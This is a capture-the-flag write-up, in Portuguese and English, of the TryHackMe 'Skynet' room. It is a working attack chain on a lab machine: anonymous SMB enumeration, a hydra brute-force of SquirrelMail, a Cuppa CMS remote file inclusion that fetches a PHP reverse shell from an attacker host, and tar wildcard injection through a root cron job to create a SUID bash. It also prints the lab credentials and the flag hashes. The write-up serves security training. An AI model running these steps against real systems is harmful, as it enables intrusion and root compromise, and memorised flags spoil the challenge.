# Skynet — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details              |
|--------------------|----------------------|
| **Name**           | Skynet               |
| **Platform**       | TryHackMe            |
| **Difficulty**     | Easy                 |
| **OS**             | Linux (Ubuntu)       |
| **Date Completed** | April 2026           |

---

## Attack Chain

```
RECON       →  nmap                              →  HTTP(80), SMB(139/445), POP3(110)
SMB         →  acesso anônimo /anonymous         →  attention.txt + log1.txt (wordlist)
BRUTE       →  hydra → SquirrelMail              →  milesdyson:cyborg007haloterminator
EMAIL       →  inbox milesdyson                  →  senha SMB + diretório oculto /45kra24zxs28v3yd
RFI         →  Cuppa CMS urlConfig               →  reverse shell como www-data
USER FLAG   →  /home/milesdyson/user.txt         →  7ce5c2109a40f958099283600a9ae807
PRIVESC     →  cron + tar wildcard injection     →  SUID bash /tmp/rootbash
ROOT FLAG   →  /root/root.txt                    →  3f0372db24753accc7179a282cd6a949
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

| Port    | Service | Version       | Note                          |
|---------|---------|---------------|-------------------------------|
| 80/tcp  | HTTP    | Apache 2.4.18 | Skynet web server             |
| 110/tcp | POP3    | Dovecot       | Serviço de e-mail             |
| 139/tcp | SMB     | Samba 4.x     | Compartilhamento de arquivos  |
| 143/tcp | IMAP    | Dovecot       | —                             |
| 445/tcp | SMB     | Samba 4.x     | Compartilhamento de arquivos  |

Superfície de ataque mais ampla que as rooms anteriores — quatro serviços distintos. SMB anônimo é o ponto de entrada mais promissor para coleta de inteligência inicial.

### SMB Enumeration

```bash
# Listar compartilhamentos disponíveis
smbclient -L //<IP> -N

# Acessar o compartilhamento anônimo
smbclient //<IP>/anonymous -N

# Dentro do smbclient
smb> ls
smb> get attention.txt
smb> cd logs
smb> get log1.txt
smb> get log2.txt
smb> get log3.txt
```

**Conteúdo relevante:**

`attention.txt` — mensagem de Miles Dyson para funcionários sobre senhas comprometidas, confirmando o username `milesdyson`.

`log1.txt` — lista de senhas potenciais. Funciona como wordlist para brute-force.

`log2.txt` e `log3.txt` — vazios. Não relevantes.

### SquirrelMail Brute-Force

```bash
hydra -l milesdyson -P log1.txt <IP> http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:incorrect"
```

**Credenciais obtidas:** `milesdyson:cyborg007haloterminator`

### Email — Descoberta do Diretório Oculto

Login no SquirrelMail em `http://<IP>/squirrelmail/` com as credenciais obtidas.

Inbox de milesdyson continha e-mail com:
- Nova senha de rede SMB: `)s{A&2Z=F^n_E.B\``
- Diretório oculto no servidor web: `/45kra24zxs28v3yd`

### Directory Enumeration — Diretório Oculto

```bash
gobuster dir \
  -u http://<IP>/45kra24zxs28v3yd/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster_hidden.txt
```

Resultado: `/45kra24zxs28v3yd/administrator/` — painel do Cuppa CMS.

---

## Initial Access

### Remote File Inclusion — Cuppa CMS

O Cuppa CMS 1.0 tem uma vulnerabilidade documentada de **Remote File Inclusion (RFI)** no parâmetro `urlConfig` do arquivo `alertConfigField.php`.

**Referência:** Exploit-DB #25971

O parâmetro aceita URLs externas sem sanitização — o servidor busca e executa o arquivo remoto como PHP.

**Preparar o payload no Kali:**

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar: $ip = '<KALI_IP>'; $port = 4444;

# Servir o arquivo via HTTP
python3 -m http.server 8080
```

**Listener:**

```bash
nc -lvnp 4444
```

**Disparar o RFI:**

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<KALI_IP>:8080/shell.php"
```

O servidor Skynet busca `shell.php` no Kali, executa o código PHP e conecta de volta ao listener.

Shell recebida como `www-data`. Estabilização:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-Exploitation

```bash
cat /home/milesdyson/user.txt
# 7ce5c2109a40f958099283600a9ae807
```

---

## Privilege Escalation

### Identificação do Vetor — Cron + Tar

```bash
# Verificar crontabs do sistema
cat /etc/crontab
```

Entrada encontrada:

```
*/1 * * * *  root  cd /home/milesdyson/backups && tar czf /home/milesdyson/backups/backup.tgz *
```

Todo minuto, root executa `tar` com wildcard `*` no diretório de backups. O diretório `/home/milesdyson/backups/` era acessível por `www-data`.

### Tar Wildcard Injection

**Como funciona:** O shell expande `*` para os nomes de todos os arquivos no diretório antes de passar para o `tar`. Se um arquivo se chama `--checkpoint-action=exec=sh exploit.sh`, o shell o passa como argumento para o `tar`. O `tar` interpreta como flag legítima e executa o comando especificado.

```
tar czf backup.tgz *
          ↓ shell expande *
tar czf backup.tgz arquivo1 arquivo2 --checkpoint=1 --checkpoint-action=exec=sh exploit.sh
          ↓ tar interpreta como argumentos
tar executa: sh exploit.sh  (como root, via cron)
```

**Exploit:**

```bash
cd /home/milesdyson/backups

# Criar o script que será executado como root
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > exploit.sh
chmod +x exploit.sh

# Criar os arquivos com nomes de flags do tar
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh exploit.sh"
```

Aguardar até 60 segundos para o cron disparar.

```bash
# Verificar se o rootbash foi criado
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash

# Escalar para root
/tmp/rootbash -p

whoami
# root

cat /root/root.txt
# 3f0372db24753accc7179a282cd6a949
```

---

## Flags

| File       | Path                      | Flag                               |
|------------|---------------------------|------------------------------------|
| `user.txt` | `/home/milesdyson/`       | `7ce5c2109a40f958099283600a9ae807` |
| `root.txt` | `/root/`                  | `3f0372db24753accc7179a282cd6a949` |

---

## Lições Aprendidas

**SMB anônimo em redes internas é uma fonte de inteligência crítica.** O compartilhamento `anonymous` entregou um wordlist funcional e o username do alvo sem nenhuma autenticação. Em ambientes reais, compartilhamentos SMB sem senha são um dos vetores de reconhecimento mais explorados em redes Windows e Linux com Samba.

**E-mails internos comprometidos revelam infraestrutura oculta.** O inbox de milesdyson continha o caminho do diretório oculto que não apareceu no gobuster inicial. Enumeração de e-mails após comprometer credenciais é uma etapa que frequentemente é ignorada — e nesta room foi o pivô para o acesso inicial.

**Tar wildcard injection via cron é um dos vetores de privesc mais elegantes.** O `tar` com `*` em diretório controlável pelo atacante e executado por root via cron é uma configuração que aparece em ambientes reais de backup. A proteção é simples: usar caminhos explícitos em vez de wildcards (`tar czf backup.tgz /home/milesdyson/backups/` em vez de `*`).

```bash
# Referência — detectar cron jobs vulneráveis
cat /etc/crontab
ls -la /etc/cron*

# Tar wildcard injection — criar os arquivos de checkpoint
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh exploit.sh"

# Verificar SUID criado
ls -la /tmp/rootbash
/tmp/rootbash -p
```

---

## Tools Used

| Tool        | Purpose                                          |
|-------------|--------------------------------------------------|
| `nmap`      | Port scanning e detecção de serviços             |
| `smbclient` | Enumeração e download via SMB anônimo            |
| `hydra`     | Brute-force HTTP POST no SquirrelMail            |
| `gobuster`  | Enumeração de diretórios — descoberta do CMS     |
| `netcat`    | Listener para reverse shell                      |
| `python3`   | Servidor HTTP para servir o payload RFI          |

---

## References

- [Exploit-DB #25971](https://www.exploit-db.com/exploits/25971) — Cuppa CMS 1.0 Remote File Inclusion
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/) — wildcard injection
- [HackTricks — Tar Wildcard](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks) — técnica detalhada

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*